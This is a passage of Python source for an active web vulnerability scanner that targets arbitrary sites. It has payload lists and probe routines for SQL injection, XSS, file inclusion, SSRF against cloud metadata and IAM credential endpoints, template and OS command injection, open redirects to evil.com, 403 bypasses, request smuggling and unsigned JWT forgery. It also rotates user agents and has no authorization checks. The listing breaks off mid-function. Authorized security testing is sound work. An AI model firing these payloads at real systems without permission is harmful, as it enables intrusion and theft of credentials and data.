# modules/web_vuln_scanner.py
# target: any HTTP/HTTPS web application

import re
import time
import random
import hashlib
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class VulnFinding:
    vuln_type: str
    severity: str          # critical / high / medium / low / info
    url: str
    parameter: Optional[str]
    payload: Optional[str]
    evidence: str
    confidence: str        # confirmed / likely / potential
    cwe: Optional[str] = None
    cvss: Optional[float] = None


@dataclass
class ScanState:
    """Shared mutable state passed between scan phases."""
    target_url: str
    domain: str
    discovered_endpoints: List[str] = field(default_factory=list)
    discovered_params: Dict[str, List[str]] = field(default_factory=dict)
    findings: List[VulnFinding] = field(default_factory=list)
    baseline_hashes: Dict[str, str] = field(default_factory=dict)
    lock: threading.Lock = field(default_factory=threading.Lock)


# ---------------------------------------------------------------------------
# Session factory
# ---------------------------------------------------------------------------

def _build_session(proxy: Optional[str] = None) -> requests.Session:
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=40)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    session.verify = False
    return session


_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]


def _random_ua() -> str:
    return random.choice(_UA_POOL)


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _get(session: requests.Session, url: str, params: Optional[Dict] = None,
         timeout: float = 8.0, allow_redirects: bool = True) -> Optional[requests.Response]:
    try:
        headers = {"User-Agent": _random_ua()}
        return session.get(url, params=params, headers=headers,
                           timeout=timeout, allow_redirects=allow_redirects)
    except requests.RequestException:
        return None
        
        
def _post(session: requests.Session, url: str, data: Optional[Dict] = None,
          json_body: Optional[Dict] = None, timeout: float = 8.0) -> Optional[requests.Response]:
    try:
        headers = {"User-Agent": _random_ua(),
                   "Content-Type": "application/x-www-form-urlencoded"}
        return session.post(url, data=data, json=json_body,
                            headers=headers, timeout=timeout)
    except requests.RequestException:
        return None
        
        
def _body_hash(resp: requests.Response) -> str:
    return hashlib.md5(resp.content).hexdigest()


def _size_delta(a: requests.Response, b: requests.Response) -> int:
    return abs(len(a.content) - len(b.content))


# ---------------------------------------------------------------------------
# Baseline fingerprinting
# ---------------------------------------------------------------------------

def _build_baseline(session: requests.Session, state: ScanState) -> None:
    """
    Capture a stable baseline response for each known endpoint.
    Used by boolean-blind detectors to distinguish real differentials
    from dynamic content noise.
    """
    for ep in state.discovered_endpoints[:40]:
        resp = _get(session, ep)
        if resp:
            state.baseline_hashes[ep] = _body_hash(resp)


# ---------------------------------------------------------------------------
# Payload libraries
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS: List[Tuple[str, str]] = [
    # (payload, detection_hint)
    ("'", "syntax error|mysql|sqlite|pg|ora-|sql"),
    ("' OR '1'='1", "syntax error|mysql|sqlite"),
    ("' OR 1=1--", "syntax error"),
    ("1 AND 1=2 UNION SELECT NULL--", "union|column"),
    ("' AND SLEEP(4)--", "__time_based__"),
    ("'; WAITFOR DELAY '0:0:4'--", "__time_based__"),
    ("' AND (SELECT 1 FROM (SELECT(SLEEP(4)))a)--", "__time_based__"),
    ("1' ORDER BY 1--", "syntax error|unknown column"),
    ("1' ORDER BY 99--", "syntax error|unknown column"),
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--", "xpath|extractvalue"),
    ("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
     "conversion failed"),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "union|null"),
    ("\" OR \"\"=\"", "syntax error"),
    ("`OR 1=1#", "syntax error|mysql"),
]

_XSS_PAYLOADS: List[Tuple[str, str]] = [
    ("<script>alert(1)</script>", r"<script>alert\(1\)</script>"),
    ("<img src=x onerror=alert(1)>", r"onerror=alert"),
    ("\"><script>alert(1)</script>", r"<script>alert"),
    ("'><svg/onload=alert(1)>", r"onload=alert"),
    ("<details open ontoggle=alert(1)>", r"ontoggle=alert"),
    ("javascript:alert(1)", r"javascript:alert"),
    ("<iframe src=javascript:alert(1)>", r"src=javascript"),
    ("<body onload=alert(1)>", r"onload=alert"),
    ("{{7*7}}", r"49"),                   # SSTI bleed-over check
    ("<script>alert`1`</script>", r"alert`1`"),
]

_LFI_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../etc/passwd", "root:x:0"),
    ("....//....//....//etc/passwd", "root:x:0"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0"),
    ("..%252f..%252f..%252fetc%252fpasswd", "root:x:0"),
    ("../../../windows/win.ini", r"\[extensions\]"),
    ("../../../boot.ini", r"\[boot loader\]"),
    ("php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{40,}="),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "PHP Version"),
]

_SSRF_TARGETS: List[str] = [
    "http://169.254.169.254/latest/meta-data/",           # AWS IMDS v1
    "http://169.254.169.254/latest/meta-data/iam/",
    "http://metadata.google.internal/computeMetadata/v1/",# GCP
    "http://169.254.169.254/metadata/v1/",                # DigitalOcean
    "http://169.254.169.254/metadata/instance",           # Azure
    "http://100.100.100.200/latest/meta-data/",           # Alibaba Cloud
    "http://127.0.0.1/server-status",                     # Apache mod_status
    "http://127.0.0.1:6379/",                             # Redis
    "http://127.0.0.1:9200/_nodes",                       # Elasticsearch
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://localhost/",
]

_SSTI_PAYLOADS: List[Tuple[str, str]] = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),            # Jinja2 vs Twig divergence
    ("{{config}}", "SECRET_KEY|DEBUG"),  # Flask/Jinja2 config leak
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),   # Spring SPEL
    ("{{''.class.mro()[1].subclasses()}}", "subprocess"),
]

_CMD_INJECT_PAYLOADS: List[Tuple[str, str]] = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; sleep 4 #", "__time_based__"),
    ("| sleep 4", "__time_based__"),
    ("\n/bin/sh -c id", r"uid=\d+"),
    ("; ping -c 1 127.0.0.1 #", r"bytes from"),
    ("& whoami", r"root|www-data|apache|nginx"),
]

_OPEN_REDIRECT_PAYLOADS: List[str] = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https:evil.com",
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "/%09/evil.com",
    "//%09evil.com",
]

_REDIRECT_PARAMS = [
    "next", "url", "redirect", "redirect_to", "redirect_url",
    "return", "return_url", "returnurl", "returnto", "goto",
    "destination", "dest", "redir", "forward", "location",
    "target", "link", "go", "continue", "back",
]

_SSRF_PARAMS = [
    "url", "uri", "src", "source", "img", "image", "file", "path",
    "fetch", "load", "href", "link", "resource", "endpoint",
    "callback", "webhook", "proxy", "ping", "target", "host",
    "to", "from", "destination", "addr", "request",
]

_PATH_TRAVERSAL_SINK_PARAMS = [
    "file", "path", "page", "template", "doc", "document",
    "view", "name", "filename", "folder", "dir", "directory",
    "load", "read", "include", "require", "resource",
]

# ---------------------------------------------------------------------------
# Phase 1 — Endpoint & parameter discovery
# ---------------------------------------------------------------------------

_COMMON_PATHS = [
    "/", "/login", "/admin", "/api", "/api/v1", "/api/v2",
    "/graphql", "/search", "/index.php", "/wp-admin",
    "/xmlrpc.php", "/phpmyadmin", "/.git/HEAD", "/.env",
    "/robots.txt", "/sitemap.xml", "/config.php",
    "/backup", "/backup.zip", "/dump.sql",
    "/.htaccess", "/server-status", "/actuator",
    "/actuator/env", "/actuator/heapdump",
    "/api/swagger.json", "/swagger-ui/index.html",
    "/v1/docs", "/openapi.json",
]

_PARAM_DISCOVERY_WORDLIST = [
    "id", "user", "username", "email", "name", "search", "q",
    "query", "page", "file", "path", "url", "redirect", "next",
    "token", "key", "api_key", "action", "type", "format",
    "order", "sort", "limit", "offset", "filter", "category",
    "lang", "locale", "debug", "test", "admin", "mode",
    "callback", "jsonp", "data", "payload", "input", "output",
    "src", "dest", "from", "to", "target", "host", "port",
]


def _discover_endpoints(session: requests.Session, state: ScanState) -> None:
    """
    Crawl the target at shallow depth and supplement with common-path probing.
    Endpoints found here feed every downstream scan phase.
    """
    found: List[str] = []
    base = state.target_url.rstrip("/")
    base_domain = state.domain

    # Probe known paths in parallel
    def _probe(path: str) -> Optional[str]:
        url = base + path
        resp = _get(session, url, allow_redirects=False)
        if resp and resp.status_code not in (404, 410, 400):
            return url
        return None
        
    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = {ex.submit(_probe, p): p for p in _COMMON_PATHS}
        for f in as_completed(futures):
            r = f.result()
            if r:
                found.append(r)
                
    # Shallow crawler — extract hrefs from the root page
    root = _get(session, base)
    if root and root.status_code == 200:
        for match in re.finditer(
            r'(?:href|action|src)=["\']([^"\'#\s]+)["\']',
            root.text, re.I
        ):
            href = match.group(1)
            if href.startswith("http"):
                if base_domain not in href:
                    continue
                candidate = href
            elif href.startswith("/"):
                candidate = base + href
            else:
                candidate = base + "/" + href

            candidate = candidate.split("?")[0]
            if candidate not in found:
                found.append(candidate)

    with state.lock:
        state.discovered_endpoints = list(dict.fromkeys(found))
        
        
def _discover_parameters(session: requests.Session, state: ScanState) -> None:
    """
    Probe endpoints with wordlist parameters; record any that produce a
    response differential (size or status change) compared to a no-param baseline.
    """
    for ep in state.discovered_endpoints[:20]:
        resp0 = _get(session, ep)
        if not resp0:
            continue
        base_len = len(resp0.content)

        sensitive: List[str] = []
        for param in _PARAM_DISCOVERY_WORDLIST:
            resp = _get(session, ep, params={param: "FUZZ_PROBE_1337"})
            if resp and abs(len(resp.content) - base_len) > 50:
                sensitive.append(param)

        if sensitive:
            with state.lock:
                state.discovered_params[ep] = sensitive


# ---------------------------------------------------------------------------
# Phase 2 — SQL injection (error + time-based blind)
# ---------------------------------------------------------------------------

def _sqli_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    _SQLI_ERR = re.compile(
        r"(sql syntax|you have an error|syntax error|mysql_num_rows|"
        r"ORA-\d{5}|PostgreSQL.*ERROR|Warning.*pg_|"
        r"SQLite.*error|Microsoft.*ODBC|Unclosed quotation mark)",
        re.I
    )

    for ep, params in state.discovered_params.items():
        for param in params:
            for payload, hint in _SQLI_PAYLOADS:
                if hint == "__time_based__":
                    # Time-based blind — measure wall clock
                    t0 = time.monotonic()
                    resp = _get(session, ep, params={param: payload})
                    elapsed = time.monotonic() - t0
                    if resp and elapsed >= 3.5:
                        findings.append(VulnFinding(
                            vuln_type="SQL Injection (Time-Based Blind)",
                            severity="critical",
                            url=ep,
                            parameter=param,
                            payload=payload,
                            evidence=f"Response delayed {elapsed:.1f}s",
                            confidence="likely",
                            cwe="CWE-89",
                            cvss=9.8,
                        ))
                else:
                    resp = _get(session, ep, params={param: payload})
                    if not resp:
                        continue
                    if _SQLI_ERR.search(resp.text):
                        findings.append(VulnFinding(
                            vuln_type="SQL Injection (Error-Based)",
                            severity="critical",
                            url=ep,
                            parameter=param,
                            payload=payload,
                            evidence=_SQLI_ERR.search(resp.text).group(0)[:120],
                            confidence="confirmed",
                            cwe="CWE-89",
                            cvss=9.8,
                        ))

    return findings


# ---------------------------------------------------------------------------
# Phase 3 — Reflected XSS
# ---------------------------------------------------------------------------

def _xss_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    for ep, params in state.discovered_params.items():
        for param in params:
            for payload, pattern in _XSS_PAYLOADS:
                resp = _get(session, ep, params={param: payload})
                if not resp:
                    continue
                ct = resp.headers.get("Content-Type", "")
                if "text/html" not in ct and "application/xhtml" not in ct:
                    continue
                if re.search(pattern, resp.text, re.I):
                    # Confirm CSP is absent or ineffective
                    csp = resp.headers.get("Content-Security-Policy", "")
                    effective = bool(
                        re.search(r"script-src\s+(?!'unsafe-inline')", csp)
                    )
                    severity = "medium" if effective else "high"
                    findings.append(VulnFinding(
                        vuln_type="Reflected XSS",
                        severity=severity,
                        url=ep,
                        parameter=param,
                        payload=payload,
                        evidence=resp.text[
                            max(0, resp.text.lower().find(payload[:10].lower()) - 20):
                            resp.text.lower().find(payload[:10].lower()) + 60
                        ],
                        confidence="confirmed",
                        cwe="CWE-79",
                        cvss=6.1,
                    ))

    return findings


# ---------------------------------------------------------------------------
# Phase 4 — Path traversal / LFI
# ---------------------------------------------------------------------------

def _lfi_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    # Only probe params whose names suggest file inclusion
    for ep, params in state.discovered_params.items():
        sink_params = [p for p in params if p in _PATH_TRAVERSAL_SINK_PARAMS]
        for param in sink_params:
            for payload, pattern in _LFI_PAYLOADS:
                resp = _get(session, ep, params={param: payload})
                if not resp:
                    continue
                if re.search(pattern, resp.text, re.I | re.M):
                    findings.append(VulnFinding(
                        vuln_type="Local File Inclusion / Path Traversal",
                        severity="critical",
                        url=ep,
                        parameter=param,
                        payload=payload,
                        evidence=re.search(pattern, resp.text).group(0)[:120],
                        confidence="confirmed",
                        cwe="CWE-22",
                        cvss=9.1,
                    ))

    return findings


# ---------------------------------------------------------------------------
# Phase 5 — SSRF
# ---------------------------------------------------------------------------

def _ssrf_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    _SSRF_EVIDENCE = re.compile(
        r"(ami-id|instance-id|computeMetadata|iam/security-credentials|"
        r"metadata\.google|latest/meta-data|Connected to redis|"
        r"\"cluster_name\"\s*:|_cluster_health\s*:|\"number_of_nodes\")",
        re.I
    )

    for ep, params in state.discovered_params.items():
        ssrf_params = [p for p in params if p in _SSRF_PARAMS]
        for param in ssrf_params:
            for target_url in _SSRF_TARGETS:
                resp = _get(session, ep, params={param: target_url}, timeout=6.0)
                if not resp:
                    continue
                if _SSRF_EVIDENCE.search(resp.text) or resp.status_code == 200 and len(resp.text) > 30:
                    match = _SSRF_EVIDENCE.search(resp.text)
                    evidence = match.group(0)[:100] if match else f"HTTP {resp.status_code}, {len(resp.text)}B"
                    findings.append(VulnFinding(
                        vuln_type="Server-Side Request Forgery (SSRF)",
                        severity="critical",
                        url=ep,
                        parameter=param,
                        payload=target_url,
                        evidence=evidence,
                        confidence="confirmed" if match else "potential",
                        cwe="CWE-918",
                        cvss=9.8,
                    ))
                    break  # First confirmed hit per param is enough

    return findings


# ---------------------------------------------------------------------------
# Phase 6 — SSTI
# ---------------------------------------------------------------------------

def _ssti_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    for ep, params in state.discovered_params.items():
        for param in params:
            for payload, expected in _SSTI_PAYLOADS:
                resp = _get(session, ep, params={param: payload})
                if not resp:
                    continue
                if re.search(expected, resp.text, re.I):
                    findings.append(VulnFinding(
                        vuln_type="Server-Side Template Injection (SSTI)",
                        severity="critical",
                        url=ep,
                        parameter=param,
                        payload=payload,
                        evidence=re.search(expected, resp.text).group(0)[:80],
                        confidence="confirmed",
                        cwe="CWE-94",
                        cvss=9.8,
                    ))

    return findings


# ---------------------------------------------------------------------------
# Phase 7 — Command injection
# ---------------------------------------------------------------------------

def _cmd_inject_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    for ep, params in state.discovered_params.items():
        for param in params:
            for payload, hint in _CMD_INJECT_PAYLOADS:
                if hint == "__time_based__":
                    t0 = time.monotonic()
                    resp = _get(session, ep, params={param: payload})
                    elapsed = time.monotonic() - t0
                    if resp and elapsed >= 3.5:
                        findings.append(VulnFinding(
                            vuln_type="OS Command Injection (Time-Based)",
                            severity="critical",
                            url=ep,
                            parameter=param,
                            payload=payload,
                            evidence=f"Delayed {elapsed:.1f}s",
                            confidence="likely",
                            cwe="CWE-78",
                            cvss=9.8,
                        ))
                else:
                    resp = _get(session, ep, params={param: payload})
                    if not resp:
                        continue
                    if re.search(hint, resp.text):
                        findings.append(VulnFinding(
                            vuln_type="OS Command Injection",
                            severity="critical",
                            url=ep,
                            parameter=param,
                            payload=payload,
                            evidence=re.search(hint, resp.text).group(0)[:80],
                            confidence="confirmed",
                            cwe="CWE-78",
                            cvss=9.8,
                        ))

    return findings


# ---------------------------------------------------------------------------
# Phase 8 — Open redirect
# ---------------------------------------------------------------------------

def _open_redirect_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []

    for ep in state.discovered_endpoints:
        for param in _REDIRECT_PARAMS:
            for payload in _OPEN_REDIRECT_PAYLOADS:
                resp = _get(session, ep, params={param: payload},
                            allow_redirects=False, timeout=5.0)
                if not resp:
                    continue
                if resp.status_code in (301, 302, 303, 307, 308):
                    loc = resp.headers.get("Location", "")
                    if "evil.com" in loc or loc.startswith("//"):
                        findings.append(VulnFinding(
                            vuln_type="Open Redirect",
                            severity="medium",
                            url=ep,
                            parameter=param,
                            payload=payload,
                            evidence=f"Location: {loc}",
                            confidence="confirmed",
                            cwe="CWE-601",
                            cvss=4.7,
                        ))

    return findings


# ---------------------------------------------------------------------------
# Phase 9 — Security header analysis
# ---------------------------------------------------------------------------

def _header_audit(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    """
    Check security-relevant response headers on the root and up to 5 endpoints.
    Each missing or misconfigured header is an info/low severity finding.
    """
    findings: List[VulnFinding] = []
    targets = ([state.target_url] + state.discovered_endpoints[:5])

    # (header_name, required_pattern, vuln_label, severity)
    _CHECKS: List[Tuple[str, Optional[str], str, str]] = [
        ("Strict-Transport-Security", r"max-age=\d+",
         "Missing / weak HSTS", "medium"),
        ("Content-Security-Policy", None,
         "Missing Content-Security-Policy", "medium"),
        ("X-Frame-Options", r"DENY|SAMEORIGIN",
         "Missing X-Frame-Options (clickjacking)", "low"),
        ("X-Content-Type-Options", "nosniff",
         "Missing X-Content-Type-Options", "low"),
        ("Referrer-Policy", None,
         "Missing Referrer-Policy", "info"),
        ("Permissions-Policy", None,
         "Missing Permissions-Policy", "info"),
    ]

    seen: set = set()

    for url in targets:
        resp = _get(session, url, allow_redirects=True)
        if not resp:
            continue
        for header, pattern, label, sev in _CHECKS:
            if label in seen:
                continue
            value = resp.headers.get(header, "")
            if not value:
                missing = True
            elif pattern:
                missing = not re.search(pattern, value, re.I)
            else:
                missing = False

            if missing:
                seen.add(label)
                findings.append(VulnFinding(
                    vuln_type="Security Header Misconfiguration",
                    severity=sev,
                    url=url,
                    parameter=None,
                    payload=None,
                    evidence=f"{header}: {value!r}" if value else f"{header} absent",
                    confidence="confirmed",
                    cwe="CWE-693",
                ))

        # Extra check: X-Powered-By / Server fingerprint leak
        for leak_header in ("X-Powered-By", "Server", "X-AspNet-Version"):
            val = resp.headers.get(leak_header, "")
            if val and leak_header not in seen:
                seen.add(leak_header)
                findings.append(VulnFinding(
                    vuln_type="Technology Disclosure via Response Header",
                    severity="info",
                    url=url,
                    parameter=None,
                    payload=None,
                    evidence=f"{leak_header}: {val}",
                    confidence="confirmed",
                    cwe="CWE-200",
                ))

    return findings


# ---------------------------------------------------------------------------
# Phase 10 — CORS misconfiguration
# ---------------------------------------------------------------------------

def _cors_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    evil_origins = [
        "https://evil.com",
        f"https://{state.domain}.evil.com",
        "null",
    ]

    for ep in state.discovered_endpoints[:15]:
        for origin in evil_origins:
            try:
                resp = session.options(
                    ep,
                    headers={"Origin": origin, "User-Agent": _random_ua()},
                    timeout=6.0,
                )
            except requests.RequestException:
                continue

            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                findings.append(VulnFinding(
                    vuln_type="CORS — Wildcard Origin",
                    severity="medium",
                    url=ep,
                    parameter=None,
                    payload=origin,
                    evidence=f"ACAO: {acao}",
                    confidence="confirmed",
                    cwe="CWE-942",
                    cvss=5.4,
                ))
            elif acao == origin and acac.lower() == "true":
                # Reflected origin + credentials: auth bypass risk
                severity = "high" if origin != "null" else "medium"
                findings.append(VulnFinding(
                    vuln_type="CORS — Origin Reflection with Credentials",
                    severity=severity,
                    url=ep,
                    parameter=None,
                    payload=origin,
                    evidence=f"ACAO: {acao} | ACAC: {acac}",
                    confidence="confirmed",
                    cwe="CWE-942",
                    cvss=8.1,
                ))
            elif origin == "null" and acao == "null":
                findings.append(VulnFinding(
                    vuln_type="CORS — Null Origin Accepted",
                    severity="medium",
                    url=ep,
                    parameter=None,
                    payload="null",
                    evidence=f"ACAO: {acao}",
                    confidence="confirmed",
                    cwe="CWE-942",
                    cvss=5.4,
                ))

    return findings


# ---------------------------------------------------------------------------
# Phase 11 — Sensitive file / info disclosure
# ---------------------------------------------------------------------------

_SENSITIVE_PATHS: List[Tuple[str, str, str]] = [
    # (path, evidence_pattern, description)
    ("/.git/HEAD", r"ref: refs/", "Git repository exposed"),
    ("/.env", r"(DB_PASSWORD|APP_KEY|SECRET|API_KEY)", ".env file exposed"),
    ("/backup.zip", r"PK\x03\x04", "Backup archive exposed"),
    ("/backup.sql", r"(CREATE TABLE|INSERT INTO)", "SQL dump exposed"),
    ("/config.php", r"(<\?php|DB_|password)", "Config file exposed"),
    ("/wp-config.php", r"DB_PASSWORD", "WordPress config exposed"),
    ("/.htaccess", r"(RewriteEngine|Options|AuthType)", ".htaccess exposed"),
    ("/server-status", r"(Apache Server Status|Total accesses)", "Apache server-status"),
    ("/actuator/env", r"(\"activeProfiles\"|\"propertySources\")", "Spring Boot env exposed"),
    ("/actuator/heapdump", r"\x00", "Spring Boot heap dump"),
    ("/.DS_Store", r"\x00\x00\x00\x01\x62\x70", "macOS .DS_Store"),
    ("/phpinfo.php", r"PHP Version", "phpinfo() exposed"),
    ("/info.php", r"PHP Version", "phpinfo() exposed"),
    ("/api/swagger.json", r"\"swagger\"\s*:", "Swagger API spec exposed"),
    ("/openapi.json", r"\"openapi\"\s*:", "OpenAPI spec exposed"),
    ("/robots.txt", r"Disallow:", "robots.txt — may reveal hidden paths"),
]


def _info_disclosure_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    base = state.target_url.rstrip("/")

    def _probe(entry: Tuple[str, str, str]) -> Optional[VulnFinding]:
        path, pattern, desc = entry
        url = base + path
        resp = _get(session, url, allow_redirects=False)
        if not resp or resp.status_code in (404, 403, 410):
            return None
        if re.search(pattern, resp.text, re.I | re.S):
            snippet = re.search(pattern, resp.text, re.I | re.S).group(0)[:80]
            severity = "critical" if "DB_PASSWORD" in pattern or "heap" in desc.lower() else "high"
            return VulnFinding(
                vuln_type="Sensitive File / Information Disclosure",
                severity=severity,
                url=url,
                parameter=None,
                payload=None,
                evidence=f"{desc} — {repr(snippet)}",
                confidence="confirmed",
                cwe="CWE-200",
                cvss=7.5 if severity == "high" else 9.1,
            )
        return None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe, entry) for entry in _SENSITIVE_PATHS]
        for f in as_completed(futures):
            r = f.result()
            if r:
                findings.append(r)

    return findings


# ---------------------------------------------------------------------------
# Phase 12 — HTTP request smuggling (passive probe)
# ---------------------------------------------------------------------------

def _smuggling_probe(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    """
    Send ambiguous CL + TE headers; a vulnerable front-end/back-end chain
    may respond with 400 or time out in a distinctive pattern.
    This is a passive heuristic — not a full TE.CL / CL.TE exploit.
    """
    findings: List[VulnFinding] = []

    ambiguous_body = b"0\r\n\r\nGET /hopefully404 HTTP/1.1\r\nFoo: x"
    headers = {
        "Transfer-Encoding": "chunked",
        "Content-Length": str(len(ambiguous_body)),
        "User-Agent": _random_ua(),
    }

    for ep in state.discovered_endpoints[:8]:
        try:
            t0 = time.monotonic()
            resp = session.post(ep, data=ambiguous_body, headers=headers,
                                timeout=6.0, allow_redirects=False)
            elapsed = time.monotonic() - t0

            # A smuggled prefix that gets forwarded causes the next response
            # to come back with unexpected content or a timeout near 6s
            if elapsed >= 5.0 or (resp and resp.status_code == 400
                                   and "invalid" in resp.text.lower()):
                findings.append(VulnFinding(
                    vuln_type="HTTP Request Smuggling (CL.TE probe)",
                    severity="high",
                    url=ep,
                    parameter=None,
                    payload="CL+TE ambiguous chunked body",
                    evidence=f"Status {resp.status_code}, elapsed {elapsed:.1f}s",
                    confidence="potential",
                    cwe="CWE-444",
                    cvss=8.1,
                ))
        except requests.RequestException:
            continue

    return findings


# ---------------------------------------------------------------------------
# Phase 13 — 403 bypass
# ---------------------------------------------------------------------------

_403_BYPASS_HEADERS: List[Dict[str, str]] = [
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
]

_403_BYPASS_PATH_TRICKS: List[str] = [
    "/%2e/",        # dot-encoded
    "/./",
    "//",
    "/..;/",
    "/?anything",
    "/.json",
    ";/",
]


def _bypass_403_scan(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    findings: List[VulnFinding] = []
    base = state.target_url.rstrip("/")

    # Collect endpoints that returned 403
    blocked_endpoints = []
    for ep in state.discovered_endpoints:
        resp = _get(session, ep, allow_redirects=False)
        if resp and resp.status_code == 403:
            blocked_endpoints.append(ep)

    for ep in blocked_endpoints[:10]:
        path = ep.replace(base, "") or "/"

        # Try header-based bypass
        for header_set in _403_BYPASS_HEADERS:
            try:
                resp = session.get(ep, headers={**header_set, "User-Agent": _random_ua()},
                                   timeout=6.0, allow_redirects=False)
                if resp and resp.status_code == 200:
                    findings.append(VulnFinding(
                        vuln_type="403 Bypass via Header Injection",
                        severity="high",
                        url=ep,
                        parameter=None,
                        payload=str(header_set),
                        evidence=f"Status 200 with header {list(header_set.keys())[0]}",
                        confidence="confirmed",
                        cwe="CWE-284",
                        cvss=7.5,
                    ))
                    break
            except requests.RequestException:
                continue

        # Try path-level tricks
        for trick in _403_BYPASS_PATH_TRICKS:
            url_variant = base + trick + path.lstrip("/")
            resp = _get(session, url_variant, allow_redirects=False)
            if resp and resp.status_code == 200:
                findings.append(VulnFinding(
                    vuln_type="403 Bypass via Path Manipulation",
                    severity="high",
                    url=url_variant,
                    parameter=None,
                    payload=trick,
                    evidence=f"Original 403 at {ep} → 200 via {url_variant}",
                    confidence="confirmed",
                    cwe="CWE-284",
                    cvss=7.5,
                ))
                break

    return findings


# ---------------------------------------------------------------------------
# Phase 14 — JWT tampering probe
# ---------------------------------------------------------------------------

_JWT_ALGNONE_VARIANTS = [
    "none", "None", "NONE", "nOnE",
]


def _jwt_probe(session: requests.Session, state: ScanState) -> List[VulnFinding]:
    """
    Scan cookies and Authorization headers for JWT tokens, then probe for
    alg:none acceptance and HMAC secret weakness.
    """
    findings: List[VulnFinding] = []
    jwt_pattern = re.compile(
        r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
    )

    for ep in state.discovered_endpoints[:10]:
        resp = _get(session, ep)
        if not resp:
            continue

        # Extract JWT from Set-Cookie or response body
        tokens_found = jwt_pattern.findall(
            resp.text + str(resp.headers.get("Set-Cookie", ""))
        )
        for token in set(tokens_found):
            parts = token.split(".")
            if len(parts) != 3:
                continue

            # Probe alg:none — strip signature
            import base64, json as _json
            try:
                header_b64 = parts[0] + "=="
                header = _json.loads(base64.b64decode(header_b64))
            except Exception:
                continue

            for alg_variant in _JWT_ALGNONE_VARIANTS:
                try:
                    tampered_header = base64.b64encode(
                        _json.dumps({**header, "alg": alg_variant}).encode()
                    ).decode().rstrip("=")
                    tampered = f"{tampered_header}.{parts[1]}."
                    probe_resp = session.get(
                        ep,
                        headers={"Authorization": f"Bearer {tampered}",
                                 "User-Agent": _random_ua()},
                        timeout=6.0,
                    )
                    if probe_resp and probe_resp.status_code == 200:
                        findings.append(VulnFinding(
                            vuln_type="JWT — Algorithm Confusion (alg:none)",
                            severity="critical",
                            url=ep,
                            parameter="Authorization",
                            payload=tampered[:60] + "...",
                            evidence=f"Server accepted alg:{alg_variant} unsigned token",
                            confidence="confirmed",
                            cwe="CWE-347",
                            cvss=9.8,
                        ))
                        break
                except Exception:
                    continue

    return findings


# ---------------------------------------------------------------------------
# Aggregator — deduplicate & sort findings
# ---------------------------------------------------------------------------

_SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _dedup_sort(findings: List[VulnFinding]) -> List[VulnFinding]:
    seen: set = set()
    unique: List[VulnFinding] = []
    for f in findings:
        key = (f.vuln_type, f.url, f.parameter, f.payload)
        if key not in seen:
            seen.add(key)
            unique.append(f)
